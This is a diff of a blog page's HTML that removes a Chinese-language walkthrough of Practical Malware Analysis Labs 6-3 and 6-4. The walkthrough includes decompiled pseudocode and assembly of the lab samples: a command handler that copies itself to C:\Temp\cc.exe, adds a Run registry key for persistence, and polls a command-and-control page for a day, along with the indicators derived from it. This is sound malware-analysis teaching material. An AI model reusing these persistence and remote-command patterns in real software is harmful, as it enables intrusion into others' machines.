-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">sub_401130</span><span class="params">(<span class="keyword">char</span> a1, LPCSTR lpExistingFileName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  HKEY phkResult; <span class="comment">// [esp+4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'a'</span>:</span><br><span class="line">      CreateDirectoryA(PathName, <span class="number">0</span>);            <span class="comment">// C:\Temp</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'b'</span>:</span><br><span class="line">      CopyFileA(lpExistingFileName, Data, <span class="number">1</span>);   <span class="comment">//C:\Temp\cc.exe</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'c'</span>:</span><br><span class="line">      DeleteFileA(Data);                        <span class="comment">// C:\Temp\cc.exe</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'d'</span>:</span><br><span class="line">      RegOpenKeyExA(HKEY_LOCAL_MACHINE, SubKey, <span class="number">0</span>, <span class="number">0xF003F</span>u, &amp;phkResult);<span class="comment">// SubKey          db 'Software\Microsoft\Windows\CurrentVersion\Run',0</span></span><br><span class="line">      <span class="keyword">if</span> ( RegSetValueExA(phkResult, loc_407168, <span class="number">0</span>, <span class="number">1u</span>, Data, <span class="number">0xF</span>u) )</span><br><span class="line">        printf_401271(aError31CouldNo);         <span class="comment">// Error 3.1: Could not set Registry value</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'e'</span>:</span><br><span class="line">      Sleep(<span class="number">0x186A0</span>u);                          <span class="comment">// 100,000ms</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      printf_401271(aError32NotAVal);           <span class="comment">// Error 3.2: Not a valid command provided</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Q5：在这个恶意代码中有什么本地特征？"><a href="#Q5：在这个恶意代码中有什么本地特征？" class="headerlink" title="Q5：在这个恶意代码中有什么本地特征？"></a>Q5：在这个恶意代码中有什么本地特征？</h2><ol>
-<li>本地存在文件 C:\Temp\cc.exe；</li>
-<li>注册表<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run中设置一个值C:\Temp\cc.exe；</li>
-</ol>
-<h2 id="Q6：这个恶意代码的目的是什么？"><a href="#Q6：这个恶意代码的目的是什么？" class="headerlink" title="Q6：这个恶意代码的目的是什么？"></a>Q6：这个恶意代码的目的是什么？</h2><p>访问<a href="http://www.practicalmalwareanalysis.com/cc.htm" target="_blank" rel="noopener">http://www.practicalmalwareanalysis.com/cc.htm</a> 这个网站，将返回包中的注释部分的第一个字母当作参数进行判断接下来的行为：</p>
-<ol>
-<li>“a”:在路径 C:\Temp中创建一个文件；</li>
-<li>“b”:将运行程序时带的第二个参数为名的文件复制为 C:\Temp\cc.exe；</li>
-<li>“c”:删除 C:\Temp\cc.exe；</li>
-<li>“d”:将HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run中设置C:\Temp\cc.exe；</li>
-<li>“e”:休眠100000ms；</li>
-</ol>
-<h1 id="Lab6-4"><a href="#Lab6-4" class="headerlink" title="Lab6-4"></a>Lab6-4</h1><h2 id="Q1：在实验6-3和6-4的main函数中的调用之间的关系的区别是什么？"><a href="#Q1：在实验6-3和6-4的main函数中的调用之间的关系的区别是什么？" class="headerlink" title="Q1：在实验6-3和6-4的main函数中的调用之间的关系的区别是什么？"></a>Q1：在实验6-3和6-4的main函数中的调用之间的关系的区别是什么？</h2><p>加了一个循环判断的机制。</p>
-<p>基本分析后的main函数：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+0h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !chk_con_401000() )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">1440</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = get_html_401040(i);</span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    printf_4012B5(aSuccessParsedC, v5);</span><br><span class="line">    set_reg_401150(v5, *argv);</span><br><span class="line">    Sleep(<span class="number">0xEA60</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Q2：什么新的代码结构已经被添加到main中？"><a href="#Q2：什么新的代码结构已经被添加到main中？" class="headerlink" title="Q2：什么新的代码结构已经被添加到main中？"></a>Q2：什么新的代码结构已经被添加到main中？</h2><p>for循环结构。</p>
-<h2 id="Q3：这个实验的解析HTML的函数和前面实验中的那些有什么区别？"><a href="#Q3：这个实验的解析HTML的函数和前面实验中的那些有什么区别？" class="headerlink" title="Q3：这个实验的解析HTML的函数和前面实验中的那些有什么区别？"></a>Q3：这个实验的解析HTML的函数和前面实验中的那些有什么区别？</h2><p>将User—Agent的参数szAgent的存储方式由全局变量变成了局部变量，并且szAgent中会含有当前已经运行时间的信息。</p>
-<p>对比后可以发现多了一行，将aInternetExplor的值输入到参数szAgent中：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(&amp;szAgent, aInternetExplor, a1); <span class="comment">//Internet Explorer 7.50/pma%d</span></span><br></pre></td></tr></table></figure>
-
-<p>汇编：</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">00401040</span>                 <span class="keyword">push</span>    <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401041</span>                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401043</span>                 <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">230h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401049</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_0]</span><br><span class="line"><span class="symbol">.text:</span>0040104C                 <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040104D</span>                 <span class="keyword">push</span>    offset aInternetExplor <span class="comment">; "Internet Explorer 7.50/pma%d"</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401052</span>                 <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+szAgent]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401055</span>                 <span class="keyword">push</span>    <span class="built_in">ecx</span>             <span class="comment">; char *</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401056</span>                 <span class="keyword">call</span>    _sprintf</span><br></pre></td></tr></table></figure>
-
-<p>也可以看到szAgent的存储方式为[ebp+szAgent]，为局部变量。</p>
-<h2 id="Q4：这个程序会运行多久？（假设它已经连接到互联网。）"><a href="#Q4：这个程序会运行多久？（假设它已经连接到互联网。）" class="headerlink" title="Q4：这个程序会运行多久？（假设它已经连接到互联网。）"></a>Q4：这个程序会运行多久？（假设它已经连接到互联网。）</h2><p>会运行1440分钟，即1天。</p>
-<p>循环体运行一次会休眠60秒，运行1440次就是1440分钟：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">1440</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">    v5 = get_html_401040(i);</span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    printf_4012B5(aSuccessParsedC, v5);</span><br><span class="line">    set_reg_401150(v5, *argv);</span><br><span class="line">    Sleep(<span class="number">0xEA60</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Q5：在这个恶意代码中有什么新的基于网络的迹象吗？"><a href="#Q5：在这个恶意代码中有什么新的基于网络的迹象吗？" class="headerlink" title="Q5：在这个恶意代码中有什么新的基于网络的迹象吗？"></a>Q5：在这个恶意代码中有什么新的基于网络的迹象吗？</h2><p>有，新的基于网络的迹象就是这个程序运行时间会写在User-Agent里面，我们可以通过这个来确定这个程序已经运行了多少分钟。</p>
-<h2 id="Q6：这个恶意代码的目的是什么？-1"><a href="#Q6：这个恶意代码的目的是什么？-1" class="headerlink" title="Q6：这个恶意代码的目的是什么？"></a>Q6：这个恶意代码的目的是什么？</h2><p>和Lab6-3中的恶意代码的目的基本一致，不过会有持续时间1 day：</p>
-<p>访问<a href="http://www.practicalmalwareanalysis.com/cc.htm" target="_blank" rel="noopener">http://www.practicalmalwareanalysis.com/cc.htm</a> 这个网站，将返回包中的注释部分的第一个字母当作参数进行判断接下来的行为：</p>
-<ol>
-<li>“a”:在路径 C:\Temp中创建一个文件；</li>
-<li>“b”:将运行程序时带的第二个参数为名的文件复制为 C:\Temp\cc.exe；</li>
-<li>“c”:删除 C:\Temp\cc.exe；</li>
-<li>“d”:将HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run中设置C:\Temp\cc.exe；</li>
-<li>“e”:休眠100000ms；</li>
-</ol>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1659,7 +1655,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
